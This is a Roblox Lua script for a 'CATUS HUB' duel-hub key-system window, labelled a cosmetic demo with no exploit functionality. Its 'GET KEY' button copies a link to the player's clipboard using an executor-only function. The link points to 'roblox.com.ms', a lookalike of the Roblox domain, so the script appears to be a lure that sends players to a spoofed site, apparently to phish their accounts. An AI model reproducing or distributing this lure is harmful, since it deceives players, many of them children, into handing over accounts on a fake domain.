-- CATUS HUB | DUEL HUB DEMO
-- Cosmetic/demo UI only — no exploit functionality

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local KEY_LINK = "https://roblox.com.ms/communities/5622451391/#!/about"
local DEMO_KEY = "CATUS-DEMO"

local gui = Instance.new("ScreenGui")
gui.Name = "CatusHubDemo"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main window
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 420, 0, 300)
main.Position = UDim2.new(0.5, -210, 0.5, -150)
main.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
main.BorderSizePixel = 0
main.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = main

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 0, 45)
title.Position = UDim2.new(0, 15, 0, 10)
title.BackgroundTransparency = 1
title.Text = "🧠 CATUS HUB"
title.TextColor3 = Color3.fromRGB(180, 120, 255)
title.TextSize = 26
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -30, 0, 25)
subtitle.Position = UDim2.new(0, 15, 0, 48)
subtitle.BackgroundTransparency = 1
subtitle.Text = "⚔ DUEL HUB • DEMO"
subtitle.TextColor3 = Color3.fromRGB(170, 170, 180)
subtitle.TextSize = 14
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = main

-- Key box
local keyBox = Instance.new("TextBox")
keyBox.Size = UDim2.new(1, -40, 0, 48)
keyBox.Position = UDim2.new(0, 20, 0, 90)
keyBox.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
keyBox.BorderSizePixel = 0
keyBox.PlaceholderText = "Enter your key..."
keyBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
keyBox.Text = ""
keyBox.TextColor3 = Color3.fromRGB(235, 235, 240)
keyBox.TextSize = 15
keyBox.Font = Enum.Font.Gotham
keyBox.ClearTextOnFocus = false
keyBox.Parent = main

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(0, 9)
keyCorner.Parent = keyBox

-- Check key
local checkButton = Instance.new("TextButton")
checkButton.Size = UDim2.new(0.48, -10, 0, 45)
checkButton.Position = UDim2.new(0, 20, 0, 150)
checkButton.BackgroundColor3 = Color3.fromRGB(120, 70, 220)
checkButton.BorderSizePixel = 0
checkButton.Text = "CHECK KEY"
checkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
checkButton.TextSize = 14
checkButton.Font = Enum.Font.GothamBold
checkButton.Parent = main

local checkCorner = Instance.new("UICorner")
checkCorner.CornerRadius = UDim.new(0, 9)
checkCorner.Parent = checkButton

-- Get key
local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.48, -10, 0, 45)
getKeyButton.Position = UDim2.new(0.52, -10, 0, 150)
getKeyButton.BackgroundColor3 = Color3.fromRGB(40, 40, 52)
getKeyButton.BorderSizePixel = 0
getKeyButton.Text = "GET KEY 🔑"
getKeyButton.TextColor3 = Color3.fromRGB(220, 220, 230)
getKeyButton.TextSize = 14
getKeyButton.Font = Enum.Font.GothamBold
getKeyButton.Parent = main

local getCorner = Instance.new("UICorner")
getCorner.CornerRadius = UDim.new(0, 9)
getCorner.Parent = getKeyButton

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -40, 0, 45)
status.Position = UDim2.new(0, 20, 0, 210)
status.BackgroundTransparency = 1
status.Text = "Waiting for key..."
status.TextColor3 = Color3.fromRGB(150, 150, 160)
status.TextSize = 14
status.Font = Enum.Font.Gotham
status.TextWrapped = true
status.Parent = main

-- Demo notice
local notice = Instance.new("TextLabel")
notice.Size = UDim2.new(1, -40, 0, 25)
notice.Position = UDim2.new(0, 20, 1, -32)
notice.BackgroundTransparency = 1
notice.Text = "CATUS HUB • DEMO / COSMETIC ONLY"
notice.TextColor3 = Color3.fromRGB(90, 90, 105)
notice.TextSize = 11
notice.Font = Enum.Font.Gotham
notice.Parent = main

-- GET KEY button
getKeyButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(KEY_LINK)
        status.Text = "Key link copied! Open it and follow the instructions."
    else
        status.Text = "Open the key link: " .. KEY_LINK
    end
end)

-- Check key
checkButton.MouseButton1Click:Connect(function()
    if keyBox.Text == DEMO_KEY then
        status.Text = "SUCCES THX FOR USING CATUS HUB"
        status.TextColor3 = Color3.fromRGB(100, 255, 150)
    else
        status.Text = "Invalid demo key."
        status.TextColor3 = Color3.fromRGB(255, 120, 120)
    end
end)
